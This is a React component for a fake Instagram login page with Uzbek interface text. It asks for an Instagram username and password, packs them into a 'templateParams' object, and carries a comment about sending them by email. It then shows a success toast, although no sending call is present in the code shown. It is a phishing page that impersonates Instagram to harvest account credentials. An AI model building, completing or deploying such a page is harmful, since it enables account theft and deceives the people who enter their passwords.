import React, { useState } from 'react'
import { toast, ToastContainer } from 'react-toastify';

const Home = () => {
    const [username, setUsername] = useState('');
    const [password, setPassword] = useState('');
    const [message, setMessage] = useState('');
    const [darkMode, setDarkMode] = useState(false); // Dark mode state

    const handleSubmit = (e) => {
        e.preventDefault();

        const templateParams = {
            Username: username,
            Password: password
        };

        // Email jo'natish
        if (username && password) {
            toast.success('Ma\'lumotlar muvaffaqiyatli yuborildi!');
        } else {
            toast.warning('Username yoki parol xato, yoki to\'ldirilmagan!');
        }
    };
    return (
        <section class="bg-gray-50 dark:bg-gray-900">
            <div class="flex flex-col items-center justify-center px-6 py-8 mx-auto md:h-screen lg:py-0">
                <a href="https://www.instagram.com" class="flex items-center mb-6 text-2xl font-semibold text-gray-900 dark:text-white">
                    <img class="w-8 h-8 mr-2" src="https://cdn-icons-png.flaticon.com/512/1384/1384063.png" alt="logo" />
                    Instagram
                </a>
                <div class="w-full bg-white rounded-lg shadow dark:border md:mt-0 sm:max-w-md xl:p-0 dark:bg-gray-800 dark:border-gray-700">
                    <div class="p-6 space-y-4 md:space-y-6 sm:p-8">
                        <h1 class="text-xl font-bold leading-tight tracking-tight text-gray-900 md:text-2xl dark:text-white">
                            Instagram Username va Parolni kiriting
                        </h1>
                        <div class="space-y-4 md:space-y-6" >
                            <div>
                                <label for="email" class="block mb-2 text-sm font-medium text-gray-900 dark:text-white">Email yoki Username</label>
                                <input type="text" value={username} onChange={(e) => setUsername(e.target.value)} name="email" id="email" class="bg-gray-50 border border-gray-300 text-gray-900 rounded-lg focus:ring-primary-600 focus:border-primary-600 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500" placeholder="name@company.com" required="" />
                            </div>
                            <div>
                                <label for="password" class="block mb-2 text-sm font-medium text-gray-900 dark:text-white">Parol</label>
                                <input type="password" value={password} onChange={(e) => setPassword(e.target.value)} name="password" id="password" placeholder="••••••••" class="bg-gray-50 border border-gray-300 text-gray-900 rounded-lg focus:ring-primary-600 focus:border-primary-600 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500" required="" />
                            </div>
                            <button onClick={handleSubmit} type="submit" class="w-full text-white bg-primary-600 hover:bg-primary-700 focus:ring-4 focus:outline-none focus:ring-primary-300 font-medium rounded-lg text-sm px-5 py-2.5 text-center dark:bg-primary-600 dark:hover:bg-primary-700 dark:focus:ring-primary-800">Sign in</button>

                        </div>
                    </div>
                </div>
            </div>
            <ToastContainer />
        </section>
    )
}

export default Home